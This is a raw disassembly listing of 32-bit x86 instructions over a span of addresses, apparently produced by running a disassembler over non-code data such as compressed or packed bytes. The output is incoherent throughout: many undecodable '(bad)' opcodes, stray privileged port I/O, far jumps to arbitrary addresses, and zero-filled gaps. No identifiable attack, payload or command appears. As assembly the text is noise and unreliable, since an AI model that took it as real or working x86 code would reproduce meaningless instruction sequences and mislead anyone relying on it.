  42e557:	cs and al,0x36
  42e55a:	xor    al,0x74
  42e55c:	or     al,0x76
  42e55e:	dec    edi
  42e55f:	dec    ebp
  42e560:	ficom  WORD PTR [eax]
  42e562:	mov    dl,0xe5
  42e564:	dec    ebx
  42e565:	sub    DWORD PTR [ecx-0x30ecfedd],edx
  42e56b:	jl     0x42e520
  42e56d:	or     BYTE PTR [eax+ebx*8+0x5c1ef45e],ch
  42e574:	sahf   
  42e575:	(bad)  
  42e576:	jne    0x42e5ea
  42e578:	mov    eax,ds:0x1726ab4e
  42e57d:	inc    esp
  42e57e:	ret    
  42e57f:	jo     0x42e540
  42e581:	fwait
  42e582:	or     al,0x9b
  42e584:	sbb    edx,DWORD PTR [ebx]
  42e586:	mov    esp,0xeb6d73fe
  42e58b:	push   esi
  42e58c:	xchg   DWORD PTR [ebx+0x5c],edx
  42e58f:	mov    ch,0xc5
	...
  42e5f1:	add    BYTE PTR [eax],al
  42e5f3:	add    BYTE PTR [ebp+0x38],dl
  42e5f6:	into   
  42e5f7:	adc    bh,ch
  42e5f9:	neg    bh
  42e5fb:	jge    0x42e58f
  42e5fd:	xchg   ebp,eax
  42e5fe:	jns    0x42e631
  42e600:	dec    ebx
  42e601:	mov    esp,0xf15e4fd1
  42e606:	add    DWORD PTR [eax],eax
  42e608:	add    eax,0xc2000001
  42e60d:	test   DWORD PTR [esi],esp
  42e60f:	adc    eax,0x7ba2aaaa
  42e614:	in     eax,dx
  42e615:	push   edx
  42e616:	popa   
  42e617:	xchg   bl,bl
  42e619:	mov    ?,WORD PTR [edx]
  42e61b:	shl    DWORD PTR [ebx],cl
  42e61d:	xor    dh,ch
  42e61f:	out    0xca,eax
  42e621:	xchg   edx,eax
  42e622:	sbb    BYTE PTR [eax-0x31128302],cl
  42e628:	pop    es
  42e629:	adc    BYTE PTR [eax-0x18],0xec
  42e62d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42e62e:	ror    dl,cl
  42e630:	xor    BYTE PTR [ecx],bl
  42e632:	dec    edx
  42e633:	add    DWORD PTR [eax],eax
  42e635:	mov    dl,0x9d
  42e637:	ds inc esi
  42e639:	mov    ?,WORD PTR [edx]
  42e63b:	xchg   esi,eax
  42e63c:	into   
  42e63d:	enter  0xb70a,0xbd
  42e641:	inc    edi
  42e642:	adc    al,0xbe
  42e644:	pop    edi
  42e645:	fadd   QWORD PTR [ebp+0x1af7afd1]
  42e64b:	call   0xad49:0x86ff1055
  42e652:	imul   ecx,DWORD PTR [edi-0x5a],0xffffffe5
  42e656:	push   esp
  42e657:	(bad)  
  42e658:	fnstsw WORD PTR [esi+0x7e]
  42e65b:	push   ecx
  42e65c:	pusha  
  42e65d:	push   eax
  42e65e:	sub    eax,0xfbcf47
  42e663:	iret   
  42e664:	adc    DWORD PTR [edx+0xb026f94],eax
  42e66a:	(bad)  
  42e66b:	mov    ch,0x39
  42e66d:	xchg   esi,eax
  42e66e:	aaa    
  42e66f:	sbb    ah,BYTE PTR [ebp+0x61d25c2b]
  42e675:	ror    BYTE PTR [esi+0xdaf494a],cl
  42e67b:	or     al,0xda
  42e67d:	jle    0x42e665
  42e67f:	jno    0x42e6fb
  42e681:	jp     0x42e66b
  42e683:	push   ebp
  42e684:	(bad)  
  42e685:	shr    DWORD PTR [ecx+0x60dbb547],1
  42e68b:	jg     0x42e664
  42e68d:	and    DWORD PTR ds:0xc61b576c,edx
  42e693:	test   al,0x31
  42e695:	mov    ah,0xef
  42e697:	jmp    0x86aa8060
  42e69c:	xchg   ebx,eax
  42e69d:	lahf   
  42e69e:	ins    BYTE PTR es:[edi],dx
  42e69f:	mov    eax,ds:0x255320f9
  42e6a4:	xchg   esp,eax
  42e6a5:	retf   0x3c9a
  42e6a8:	rcl    BYTE PTR [edx],0xdf
  42e6ab:	mov    esi,ss
  42e6ad:	jge    0x42e670
  42e6af:	fist   WORD PTR ss:[eax]
  42e6b2:	(bad)  [edx]
  42e6b4:	push   ss
  42e6b5:	loop   0x42e663
  42e6b7:	sbb    DWORD PTR [edx],edi
  42e6b9:	or     dl,BYTE PTR [edi+0x8]
  42e6bc:	mov    al,ds:0xdb8b7c26
  42e6c1:	inc    ecx
  42e6c2:	shr    DWORD PTR [ecx+0x85940d8],1
  42e6c8:	cmp    BYTE PTR [eax+0x478f9017],dl
  42e6ce:	out    dx,al
  42e6cf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42e6d0:	shl    DWORD PTR [ebx-0x6116b2ab],0xd3
  42e6d7:	das    
  42e6d8:	push   ecx
  42e6d9:	cmp    edx,0xfffffffa
  42e6dc:	out    0x9e,al
  42e6de:	dec    eax
  42e6df:	icebp  
  42e6e0:	shl    BYTE PTR [esi+0x669558bc],cl
  42e6e6:	xlat   BYTE PTR ds:[ebx]
  42e6e7:	cwde   
  42e6e8:	mov    eax,0x24581360
  42e6ed:	(bad)  [edx]
  42e6ef:	rcl    DWORD PTR [edx-0x27],0x3e
  42e6f3:	fdivr  QWORD PTR [eax+0x66]
  42e6f6:	mov    eax,0x1e1d3900
  42e6fb:	shl    edi,1
  42e6fd:	in     al,0xcf
  42e6ff:	mov    ecx,0x4e560498
  42e704:	ins    BYTE PTR es:[edi],dx
  42e705:	pop    es
  42e706:	jge    0x42e73b
  42e708:	adc    bh,bl
  42e70a:	out    dx,eax
  42e70b:	mov    edx,0xd4ca52fa
  42e710:	sub    DWORD PTR [eax],eax
	...
  42e772:	add    BYTE PTR [eax],al
  42e774:	pop    edx
  42e775:	cmp    DWORD PTR [esi+0x2d],ecx
  42e778:	outs   dx,DWORD PTR ds:[esi]
  42e779:	jg     0x42e7f6
  42e77b:	jg     0x42e7e1
  42e77d:	sub    BYTE PTR [esi],cl
  42e77f:	fcmovu st,st(3)
  42e781:	add    DWORD PTR [ebx+0x1f263a1],ebx
  42e787:	add    BYTE PTR ds:0x29000001,al
  42e78d:	icebp  
  42e78e:	pop    esp
  42e78f:	xor    al,0x46
  42e791:	mov    esp,0xee88926b
  42e796:	jo     0x42e73d
  42e798:	les    edx,FWORD PTR [ebp+0x21]
  42e79b:	xlat   BYTE PTR ds:[ebx]
  42e79c:	fcom   DWORD PTR [ecx]
  42e79e:	sbb    ebp,ebp
  42e7a0:	popf   
  42e7a1:	or     ebp,DWORD PTR [esi]
  42e7a3:	nop
  42e7a4:	shr    DWORD PTR [esi+0x58],1
  42e7a7:	sahf   
  42e7a8:	sti    
  42e7a9:	push   edi
  42e7aa:	aad    0x8c
  42e7ac:	mov    al,ds:0x23708156
  42e7b1:	cld    
  42e7b2:	shl    BYTE PTR [ebp+0x45],cl
  42e7b5:	icebp  
  42e7b6:	sub    eax,DWORD PTR [ecx-0x32]
  42e7b9:	cld    
  42e7ba:	sub    esp,DWORD PTR [ebx+0x4b]
  42e7bd:	mov    dl,BYTE PTR [edi+0x49a81cf3]
  42e7c3:	outs   dx,DWORD PTR ds:[esi]
  42e7c4:	pop    ebx
  42e7c5:	xor    BYTE PTR [eax],bh
  42e7c7:	pop    edi
  42e7c8:	pop    edi
  42e7c9:	jno    0x42e75e
  42e7cb:	push   ecx
  42e7cc:	mov    dh,0x99
  42e7ce:	je     0x42e7a3
  42e7d0:	dec    ecx
  42e7d1:	adc    BYTE PTR [ebp-0x1d0f4276],ah
  42e7d7:	or     bh,BYTE PTR ds:0xbb75405c
  42e7dd:	daa    
  42e7de:	sub    BYTE PTR [ecx-0x73],bl
  42e7e1:	pop    es
  42e7e2:	cli    
  42e7e3:	adc    DWORD PTR [edi+0x4cf0a54c],ebx
  42e7e9:	js     0x42e862
  42e7eb:	and    eax,DWORD PTR [ebx-0x4b2fc7f9]
  42e7f1:	mov    cl,0xd9
  42e7f3:	in     eax,dx
  42e7f4:	js     0x42e7ff
  42e7f6:	nop
  42e7f7:	cmp    DWORD PTR [edi+0x56],ebp
  42e7fa:	add    eax,0x64814743
  42e7ff:	xchg   ebx,eax
  42e800:	clc    
  42e801:	out    dx,al
  42e802:	inc    ecx
  42e803:	push   es
  42e804:	or     esi,esi
  42e806:	(bad)  
  42e807:	aad    0xd3
  42e809:	pop    esp
  42e80a:	inc    eax
  42e80b:	add    al,0x64
  42e80d:	inc    ebp
  42e80e:	inc    esp
  42e80f:	inc    esi
  42e810:	dec    ecx
  42e811:	lea    ecx,[edi-0x5246968c]
  42e817:	int    0x5f
  42e819:	dec    esp
  42e81a:	push   ds
  42e81b:	jnp    0x42e830
  42e81d:	ja     0x42e7ce
  42e81f:	sbb    ah,BYTE PTR [eax-0x43]
  42e822:	mov    cl,0xf0
  42e824:	je     0x42e7d8
  42e826:	add    ebp,eax
  42e828:	int    0x1f
  42e82a:	(bad)  
  42e82b:	ss das 
  42e82d:	(bad)  
  42e82e:	loopne 0x42e7fd
  42e830:	(bad)  
  42e831:	hlt    
  42e832:	pop    es
  42e833:	sub    dl,bh
  42e835:	push   ss
  42e836:	jbe    0x42e82e
  42e838:	push   0x62f08ea3
  42e83d:	rcl    DWORD PTR [edx-0x1f986247],0x80
  42e844:	test   DWORD PTR [ebp-0x42],ebx
  42e847:	stc    
  42e848:	mov    ch,0x13
  42e84b:	sub    DWORD PTR [edi-0x5ddbbaf3],ecx
  42e851:	adc    DWORD PTR [ebx],0x65c6641
  42e857:	jns    0x42e898
  42e859:	pop    ebx
  42e85a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42e85b:	ds inc esp
  42e85d:	jmp    0x42e837
  42e85f:	inc    ecx
  42e860:	int3   
  42e861:	mov    eax,0x1a6f1de8
  42e866:	and    al,0xc0
  42e868:	push   es
  42e869:	cmp    eax,0x5e39a9cb
  42e86e:	sbb    eax,0x14836ba9
  42e873:	xor    al,0x54
  42e875:	and    DWORD PTR [edx],0xeaf60ce9
  42e87b:	cmp    ch,BYTE PTR [eax+edx*4-0x1c]
  42e87f:	add    ecx,DWORD PTR ds:0x517dcdec
  42e885:	xchg   esi,eax
  42e886:	int3   
  42e887:	ins    DWORD PTR es:[edi],dx
  42e888:	test   BYTE PTR [ebx-0x5b],ch
  42e88b:	out    dx,al
  42e88c:	outs   dx,BYTE PTR ds:[esi]
  42e88d:	ret    
  42e88e:	enter  0x25ab,0x0
	...
  42e8f2:	add    BYTE PTR [eax],al
  42e8f4:	ret    
  42e8f5:	ja     0x42e957
  42e8f7:	and    al,0xf4
  42e8f9:	aaa    
  42e8fa:	(bad)  
  42e8fb:	div    DWORD PTR [ecx+0x323f82b]
  42e901:	jecxz  0x42e8dc
  42e903:	aas    
  42e904:	push   0x50001f3
  42e909:	add    DWORD PTR [eax],eax
  42e90b:	add    bh,ch
  42e90d:	cmc    
  42e90e:	div    esp
  42e910:	imul   ebp,DWORD PTR [edx+ebx*8-0x70ecd4da],0x35
  42e918:	addr16 sti 
  42e91a:	sbb    bl,BYTE PTR [edx]
  42e91c:	push   cs
  42e91d:	xchg   esp,ecx
  42e91f:	addr16 xchg edx,eax
  42e921:	pop    edi
  42e922:	jge    0x42e97a
  42e924:	(bad)  
  42e927:	sub    cl,BYTE PTR [edi+eax*1-0x3b]
  42e92b:	fwait
  42e92c:	mov    bl,0x72
  42e92e:	fbld   TBYTE PTR [esi-0x6]
  42e931:	jmp    0x2a50:0x2b80e6b9
  42e938:	int3   
  42e939:	(bad)  
  42e93a:	idiv   bh
  42e93c:	std    
  42e93d:	add    bl,0x97
  42e940:	lock jno 0x42e941
  42e943:	inc    ebx
  42e944:	jmp    0xfdbb4bf8
  42e949:	imul   ebp,DWORD PTR [esi],0xb8029026
  42e94f:	pop    ds
  42e950:	retf   0xefd3
  42e953:	add    DWORD PTR [esp+ecx*4+0x41],0xbba5b80b
  42e95b:	xchg   edx,eax
  42e95c:	imul   esp,edx,0x50285aec
  42e962:	rcl    BYTE PTR [ebx+0x66],0xc7
  42e966:	ret    0x2155
  42e969:	jmp    0x43708af9
  42e96e:	pusha  
  42e96f:	pushf  
  42e970:	inc    ecx
  42e971:	out    0x54,eax
  42e973:	push   edx
  42e974:	jns    0x42e93a
  42e976:	loopne 0x42e9dc
  42e978:	les    eax,FWORD PTR [ebx+ebx*2-0x6a]
  42e97c:	adc    al,0x6d
  42e97e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42e97f:	clc    
  42e980:	inc    eax
  42e981:	and    eax,0x1e8b74fa
  42e986:	test   al,0xbb
  42e988:	adc    BYTE PTR [edi-0x24ab5c0a],dh
  42e98e:	push   ebp
  42e98f:	cmp    DWORD PTR [ebx+eax*8-0x10173b7d],ebp
  42e996:	pop    ds
  42e997:	in     eax,0x7e
  42e999:	das    
  42e99a:	sub    ecx,edx
  42e99c:	xor    eax,0x3e0bfad
  42e9a1:	test   BYTE PTR [ebx-0x5],bh
  42e9a4:	mov    edx,0x3583a01c
  42e9a9:	sar    DWORD PTR [ecx-0x14],1
  42e9ac:	bound  ebp,QWORD PTR [eax+0x34]
  42e9af:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42e9b0:	jno    0x42e978
  42e9b2:	aas    
  42e9b3:	adc    al,0x54
  42e9b5:	sbb    al,0x25
  42e9b7:	dec    ebp
  42e9b8:	(bad)  
  42e9b9:	add    al,0x0
  42e9bb:	sbb    esp,DWORD PTR [ebx]
  42e9bd:	fidivr DWORD PTR [eax+ecx*2+0x78]
  42e9c1:	sbb    BYTE PTR [eax+0x32893a69],bl
  42e9c7:	scas   al,BYTE PTR es:[edi]
  42e9c8:	dec    ecx
  42e9c9:	test   edi,eax
  42e9cb:	adc    al,0x58
  42e9cd:	xchg   edx,eax
  42e9ce:	(bad)  [ebp-0x38c1527e]
  42e9d4:	stos   BYTE PTR es:[edi],al
  42e9d5:	(bad)
  42e9da:	fs push edx
  42e9dc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42e9dd:	mov    edx,DWORD PTR [ecx+esi*1-0x7e2878e]
  42e9e4:	jp     0x42e9e1
  42e9e6:	ins    DWORD PTR es:[edi],dx
  42e9e7:	idiv   DWORD PTR [esi-0x2e]
  42e9ea:	and    bh,bl
  42e9ec:	jae    0x42ea03
  42e9ee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42e9ef:	into   
  42e9f0:	or     eax,0xef1e8ac6
  42e9f5:	or     edi,0x7f
  42e9f8:	pop    es
  42e9f9:	packssdw mm6,mm3
  42e9fc:	cwde   
  42e9fd:	fs jno 0x42e9e8
  42ea00:	mov    edi,0xfbc8aa36
  42ea05:	shl    BYTE PTR [edi],0x3
  42ea08:	add    eax,edi
  42ea0a:	clc    
  42ea0b:	cld    
  42ea0c:	mov    dh,0xb9
  42ea0e:	in     al,0x66
  42ea10:	into   
	...
  42ea71:	add    BYTE PTR [eax],al
  42ea73:	add    ch,ah
  42ea75:	mov    edx,0xebdfe392
  42ea7a:	cmc    
  42ea7b:	mov    esi,0x66dc160c
  42ea80:	xor    eax,0x6da46f2d
  42ea85:	hlt    
  42ea86:	add    DWORD PTR [eax],eax
  42ea88:	add    eax,0x98000001
  42ea8d:	fcmovnbe st,st(1)
  42ea8f:	mov    bh,0x42
  42ea91:	fwait
  42ea92:	into   
  42ea93:	pop    ss
  42ea94:	push   es
  42ea95:	and    cl,ch
  42ea97:	(bad)  
  42ea98:	xchg   ecx,eax
  42ea99:	mov    eax,0x8cf0e4b8
  42ea9e:	lods   eax,DWORD PTR ds:[esi]
  42ea9f:	mov    cl,0x9a
  42eaa1:	push   esi
  42eaa2:	sub    eax,0x8b160ec5
  42eaa7:	xchg   esp,eax
  42eaa8:	scas   al,BYTE PTR es:[edi]
  42eaa9:	xchg   edi,eax
  42eaaa:	sbb    cl,BYTE PTR [ecx-0x20e1251d]
  42eab0:	mov    edi,0x323e721f
  42eab5:	sti    
  42eab6:	stc    
  42eab7:	push   ebp
  42eab8:	dec    edi
  42eab9:	and    BYTE PTR [ecx-0x6f3befe7],ah
  42eabf:	dec    eax
  42eac0:	fidiv  DWORD PTR [eax+0x4e]
  42eac3:	push   esp
  42eac4:	and    ebx,DWORD PTR [edx+0x3e]
  42eac7:	jno    0x42ea83
  42eac9:	inc    eax
  42eaca:	shl    DWORD PTR [ebx-0x79a6f502],cl
  42ead0:	or     bh,BYTE PTR [ebp-0x72]
  42ead3:	dec    edx
  42ead4:	in     al,dx
  42ead5:	(bad)  
  42ead6:	ins    BYTE PTR es:[edi],dx
  42ead7:	xchg   ecx,eax
  42ead8:	in     eax,0x4
  42eada:	test   DWORD PTR [ebp+0x6a4e87b9],0x8308e003
  42eae4:	in     al,0x96
  42eae6:	mov    edx,0x3c358a4a
  42eaeb:	push   edx
  42eaec:	fs pop eax
  42eaee:	test   al,0xe1
  42eaf0:	test   eax,0x4cec9c12
  42eaf5:	adc    DWORD PTR [ecx-0x35],edx
  42eaf8:	xor    al,0xd5
  42eafa:	mov    esp,0x8a56da24
  42eaff:	out    dx,eax
  42eb00:	xchg   ebp,eax
  42eb01:	aaa    
  42eb02:	inc    ebx
  42eb03:	pop    edx
  42eb04:	adc    DWORD PTR gs:[ebx-0x51],eax
  42eb08:	or     BYTE PTR [ebp-0x4b],al
  42eb0b:	call   0x6fc43270
  42eb10:	ins    BYTE PTR es:[edi],dx
  42eb11:	cmp    BYTE PTR [esi],0xc0
  42eb14:	sub    DWORD PTR [eax],esi
  42eb16:	or     DWORD PTR [ecx+0x5b4204ac],esi
  42eb1c:	sub    DWORD PTR [ebx+eax*4+0x6fbcd42],esi
  42eb23:	mov    ecx,0x9c5a7a1b
  42eb28:	aam    0x4a
  42eb2a:	neg    BYTE PTR [esi+0x5206768f]
  42eb30:	test   al,0xab
  42eb32:	push   ecx
  42eb33:	add    al,0x6b
  42eb35:	out    0x10,al
  42eb37:	das    
  42eb38:	cdq    
  42eb39:	adc    eax,0xc650b886
  42eb3e:	jge    0x42eb88
  42eb40:	sbb    dl,BYTE PTR [ebp-0x34]
  42eb43:	pop    ecx
  42eb44:	pushf  
  42eb45:	xchg   esp,eax
  42eb46:	clc    
  42eb47:	push   ecx
  42eb48:	(bad)  
  42eb49:	or     di,WORD PTR [ecx-0x60]
  42eb4d:	adc    eax,0x21e752ec
  42eb52:	dec    ebp
  42eb53:	bound  esi,QWORD PTR [edi]
  42eb55:	fisttp DWORD PTR [edx-0x43]
  42eb58:	mov    al,0x7a
  42eb5a:	sub    ch,BYTE PTR [edi+0x772e0fb0]
  42eb60:	jmp    0xb197:0x542516fa
  42eb67:	ret    0xb132
  42eb6a:	sub    BYTE PTR [edx],bl
  42eb6c:	mov    esp,0x2e9aa4b1
  42eb71:	mov    eax,0x887489f7
  42eb76:	div    DWORD PTR [edx+0x1edea033]
  42eb7c:	fs mov ch,0xa2
  42eb7f:	pop    edi
  42eb80:	xchg   DWORD PTR [esi],eax
  42eb82:	or     al,0xf2
  42eb84:	es int3 
  42eb86:	lahf   
  42eb87:	pop    ss
  42eb88:	mov    ebx,0xa3ef86d2
  42eb8d:	pop    esi
  42eb8e:	stc    
  42eb8f:	and    BYTE PTR [ecx],cl
	...
  42ebf1:	add    BYTE PTR [eax],al
  42ebf3:	add    BYTE PTR [esi+0x41],bh
  42ebf6:	jne    0xfc41bb3b
  42ebfc:	pusha  
  42ebfd:	popf   
  42ebfe:	pop    ecx
  42ebff:	sbb    DWORD PTR [edi+0x72c80bce],0x50001f5
  42ec09:	add    DWORD PTR [eax],eax
  42ec0b:	add    BYTE PTR [edi+0x427147bd],bl
  42ec11:	or     ebp,ebp
  42ec13:	mov    edi,0x1231db6d
  42ec18:	push   esp
  42ec19:	cmp    BYTE PTR [ecx+0x8],bh
  42ec1c:	sbb    eax,0x7a24784a
  42ec21:	xchg   edx,eax
  42ec22:	stc    
  42ec23:	dec    esi
  42ec24:	clc    
  42ec25:	in     eax,dx
  42ec26:	(bad)  
  42ec27:	or     eax,0xb11c8b59
  42ec2c:	push   esp
  42ec2d:	shl    BYTE PTR [ebx-0x708aa6fd],cl
  42ec33:	pushf  
  42ec34:	mov    edi,esp
  42ec36:	inc    ebp
  42ec37:	or     eax,0xfc19ef95
  42ec3c:	add    al,0x10
  42ec3e:	cwde   
  42ec3f:	xor    ch,BYTE PTR [eax-0x1e81d7d7]
  42ec45:	mov    al,0xda
  42ec47:	cmp    eax,0xe8041308
  42ec4c:	xchg   ecx,eax
  42ec4d:	add    al,0xe2
  42ec4f:	mov    dl,0xa9
  42ec51:	mov    esp,0x91a92004
  42ec56:	push   es
  42ec57:	cwde   
  42ec58:	inc    ecx
  42ec59:	sub    edx,0x20ecef8
  42ec5f:	xlat   BYTE PTR ds:[ebx]
  42ec60:	xlat   BYTE PTR ds:[ebx]
  42ec61:	jo     0x42ebe9
  42ec63:	(bad)  
  42ec64:	fsincos 
  42ec66:	fsub   DWORD PTR [eax+esi*2]
  42ec69:	xlat   BYTE PTR ds:[ebx]
  42ec6a:	dec    eax
  42ec6b:	hlt    
  42ec6c:	pop    es
  42ec6d:	shl    BYTE PTR [esi-0x3],cl
  42ec70:	nop
  42ec71:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42ec72:	and    al,0xa4
  42ec74:	pop    eax
  42ec75:	sbb    ecx,DWORD PTR [edx-0x70064da0]
  42ec7b:	mov    esi,0xcf03ae66
  42ec80:	xor    ch,cl
  42ec82:	or     eax,0x6e285e0
  42ec87:	jp     0x42ec6a
  42ec89:	adc    al,0xe0
  42ec8b:	mov    bh,0xa
  42ec8d:	pop    es
  42ec8e:	popf   
  42ec8f:	cmp    al,0xfa
  42ec91:	daa    
  42ec92:	ficomp WORD PTR [edx]
  42ec94:	imul   DWORD PTR [eax-0x71c55229]
  42ec9a:	out    dx,al
  42ec9b:	cwde   
  42ec9c:	dec    ebp
  42ec9d:	hlt    
  42ec9e:	out    0xc2,al
  42eca0:	cmp    BYTE PTR [edx+0x52],cl
  42eca3:	inc    esp
  42eca4:	inc    edi
  42eca5:	cld    
  42eca6:	xchg   esp,eax
  42eca7:	loope  0x42ecac
  42eca9:	or     BYTE PTR [ecx+esi*4+0x472b01eb],ah
  42ecb0:	fist   WORD PTR [edx]
  42ecb2:	ror    dh,cl
  42ecb4:	pop    ds
  42ecb5:	push   ds
  42ecb6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42ecb7:	or     esp,edi
  42ecb9:	loopne 0x42ed09
  42ecbb:	aam    0xa0
  42ecbd:	(bad)  
  42ecbf:	(bad)  
  42ecc0:	cmc    
  42ecc1:	mov    cs,WORD PTR [ecx-0x32]
  42ecc4:	fs mov dl,0xac
  42ecc7:	std    
  42ecc8:	not    DWORD PTR ds:0x91c2c456
  42ecce:	mov    ds:0xf8c26c5b,eax
  42ecd3:	and    DWORD PTR [edx+0x255831e1],edx
  42ecd9:	inc    ebx
  42ecda:	repnz fldenv [edi+0x67]
  42ecde:	(bad)  
  42ecdf:	fisttp WORD PTR [esi+eiz*1]
  42ece2:	imul   ebp,DWORD PTR [esi+0x1a7c8e52],0xb056f85a
  42ecec:	xchg   ebp,eax
  42eced:	sbb    esi,DWORD PTR [ebp+0x65]
  42ecf0:	rol    DWORD PTR [esi+edx*1+0x4e1f3be8],1
  42ecf7:	bound  edx,QWORD PTR [eax]
  42ecf9:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  42ecfb:	mov    edx,DWORD PTR [ebx]
  42ecfd:	rcr    BYTE PTR [ebx-0x2a],cl
  42ed00:	call   0xd9c9:0x5809d4ea
  42ed07:	dec    esp
  42ed08:	mov    esi,0x139384d6
  42ed0d:	repz or DWORD PTR [edi+0x5d],ebx
	...
  42ed74:	sub    dh,dh
  42ed76:	scas   eax,DWORD PTR es:[edi]
  42ed77:	fdivr  st,st(7)
  42ed79:	fnstcw WORD PTR [edi-0xa]
  42ed7c:	jecxz  0x42edb0
  42ed7e:	test   DWORD PTR [edx-0xe759ee3],esp
  42ed84:	ja     0x42ed7c
  42ed86:	add    DWORD PTR [eax],eax
  42ed88:	add    eax,0x8c000001
  42ed8d:	inc    edx
  42ed8e:	push   ebx
  42ed8f:	(bad)  
  42ed90:	or     al,0x5b
  42ed92:	out    0x94,al
  42ed94:	imul   ebx,DWORD PTR [edi-0x29],0xe20763fe
  42ed9b:	mov    ds:0x73917756,eax
  42eda0:	sbb    cl,BYTE PTR ds:[ecx]
  42eda3:	add    al,0x21
  42eda5:	pop    eax
  42eda6:	xor    esi,eax
  42eda8:	or     BYTE PTR [eax+edx*1+0xf552fb6],0x69
  42edb0:	fcomp  DWORD PTR [ecx]
  42edb2:	in     al,dx
  42edb3:	imul   eax,DWORD PTR [esp+edx*4],0xa55efc8b
  42edba:	das    
  42edbb:	sar    DWORD PTR [esi+0x7f572253],1
  42edc1:	repnz stos BYTE PTR es:[edi],al
  42edc3:	xchg   ebp,eax
  42edc4:	dec    esp
  42edc5:	rol    BYTE PTR [ebx+0x6a7c0450],1
  42edcb:	add    al,0xc9
  42edcd:	in     eax,dx
  42edce:	sbb    DWORD PTR [ebx],edi
  42edd0:	add    ch,bh
  42edd2:	xchg   BYTE PTR [edi-0x6777eab3],ah
  42edd8:	packuswb mm4,QWORD PTR [edi-0x2554c7cd]
  42eddf:	jge    0x42ee39
  42ede1:	xchg   ebp,eax
  42ede2:	daa    
  42ede3:	push   edx
  42ede4:	jno    0x42ed9e
  42ede6:	and    eax,DWORD PTR fs:0x83efa3f2
  42eded:	aas    
  42edee:	sbb    ecx,DWORD PTR [ebp+0x47]
  42edf1:	bnd jb 0x42ee6a
  42edf4:	dec    edi
  42edf5:	mov    ds:0xf85d975,eax
  42edfa:	scas   al,BYTE PTR es:[edi]
  42edfb:	fidiv  WORD PTR [esi-0x65]
  42edfe:	jge    0x42ede1
  42ee00:	iret   
  42ee01:	imul   esi,eax,0x8bd022a1
  42ee07:	in     eax,0xae
  42ee09:	jae    0x42ee80
  42ee0b:	xchg   ebp,eax
  42ee0c:	push   0x485d1b27
  42ee11:	pop    es
  42ee12:	xchg   BYTE PTR [esi+0x14],dl
  42ee15:	sar    BYTE PTR [esi-0x7a],cl
  42ee18:	iret   
  42ee19:	pop    esp
  42ee1a:	movq   QWORD PTR ds:0x6bc7ae6e,mm1
  42ee21:	adc    eax,0x30075ba1
  42ee26:	push   esp
  42ee27:	mov    ebx,0x9eb9da3e
  42ee2c:	mov    al,ds:0xb3c0ef5b
  42ee31:	push   ebp
  42ee32:	jae    0x42edb5
  42ee34:	and    al,0x86
  42ee36:	in     al,0xa
  42ee38:	mov    DWORD PTR [edx-0x41bc82e6],edi
  42ee3e:	mov    cl,0x1
  42ee40:	scas   eax,DWORD PTR es:[edi]
  42ee41:	lds    esi,FWORD PTR [ebx+0x4abca1b3]
  42ee47:	jne    0x42ee5c
  42ee49:	pop    ss
  42ee4a:	and    BYTE PTR [edi-0x18],bh
  42ee4d:	and    DWORD PTR [edx],esi
  42ee4f:	dec    edx
  42ee50:	sub    BYTE PTR [esi-0x40],0x22
  42ee54:	fisubr DWORD PTR [edi+0x386a88d2]
  42ee5a:	xchg   esi,eax
  42ee5b:	rcl    DWORD PTR [eax],0x27
  42ee5e:	sbb    DWORD PTR [ecx-0x70],esp
  42ee61:	sbb    edi,DWORD PTR [edi]
  42ee63:	gs xor eax,0x4ee2578f
  42ee69:	jle    0x42eecf
  42ee6b:	std    
  42ee6c:	fadd   DWORD PTR [edx+0x1dfa4e5e]
  42ee72:	mov    dh,0x78
  42ee74:	and    bl,ch
  42ee76:	cld    
  42ee77:	or     BYTE PTR [ebp+0x77],cl
  42ee7a:	and    BYTE PTR [ebx+0xb460332],cl
  42ee80:	or     esp,edx
  42ee82:	ins    BYTE PTR es:[edi],dx
  42ee83:	jnp    0x42ee2c
  42ee85:	or     al,0x10
  42ee87:	sub    ah,BYTE PTR [edx+0xa93be48]
  42ee8d:	je     0x42ee79
  42ee8f:	and    BYTE PTR [ebx+0x0],dl
	...
  42eef1:	add    BYTE PTR [eax],al
  42eef3:	add    bl,al
  42eef5:	add    cl,BYTE PTR [eax]
  42eef7:	xor    eax,0xf6ff3fc9
  42eefc:	jb     0x42ef3a
  42eefe:	jae    0x42ef25
  42ef00:	test   BYTE PTR [eax],ah
  42ef02:	stos   BYTE PTR es:[edi],al
  42ef03:	and    edi,DWORD PTR [edi+esi*8+0x1]
  42ef07:	add    BYTE PTR ds:0xf9000001,al
  42ef0d:	or     eax,0xd9159d38
  42ef12:	mov    eax,ds:0x967208e3
  42ef17:	loop   0x42ef63
  42ef19:	xchg   ebp,eax
  42ef1a:	pop    ss
  42ef1b:	adc    ebx,edx
  42ef1d:	cdq    
  42ef1e:	dec    eax
  42ef1f:	lahf   
  42ef20:	(bad)  
  42ef21:	aad    0x55
  42ef23:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42ef24:	scas   eax,DWORD PTR es:[edi]
  42ef25:	lea    esp,[ecx]
  42ef27:	int    0x18
  42ef29:	cmp    edi,DWORD PTR [esi-0x61]
  42ef2c:	mov    ebx,0x9c6adb79
  42ef31:	lods   al,BYTE PTR ds:[esi]
  42ef32:	addr16 mov ecx,0x671bf2c1
  42ef38:	push   ds
  42ef39:	cmp    al,0x1e
  42ef3b:	inc    esp
  42ef3c:	lods   eax,DWORD PTR ds:[esi]
  42ef3d:	push   cs
  42ef3e:	jbe    0x42eec1
  42ef40:	nop
  42ef41:	jo     0x42eee8
  42ef43:	in     eax,0xe
  42ef45:	xor    ecx,DWORD PTR [ebp+0x58]
  42ef48:	sbb    dl,BYTE PTR [esi+0x6e]
  42ef4b:	mov    al,ds:0x76aaa163
  42ef50:	popa   
  42ef51:	fistp  QWORD PTR [edi]
  42ef53:	cwde   
  42ef54:	add    ah,ch
  42ef56:	dec    DWORD PTR [ebx]
  42ef58:	fsubrp st(5),st
  42ef5a:	xchg   ebx,eax
